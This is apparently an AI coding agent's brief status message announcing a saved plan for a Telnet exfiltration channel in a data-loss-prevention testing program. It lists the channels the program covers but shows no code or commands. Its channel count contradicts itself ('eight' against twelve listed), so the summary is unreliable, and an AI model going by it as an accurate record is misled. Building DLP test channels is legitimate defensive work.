**Plan complete and saved to `orchestrator/docs/superpowers/plans/2026-09-02-telnet-exfiltration-channel.md`.**

**Execution approach:** Inline execution via superpowers:executing-plans (established session preference, consistent with webhook channel).

Five tasks, ~90 minutes total. Each task commits and pushes independently. After Task 5's verification, the DLP exfiltration channel program is complete — all eight channels (HTTPS, DNS, SFTP, SMTP, cloud storage, webhooks, Telnet, plus five agent-native local channels) shipped and verified.
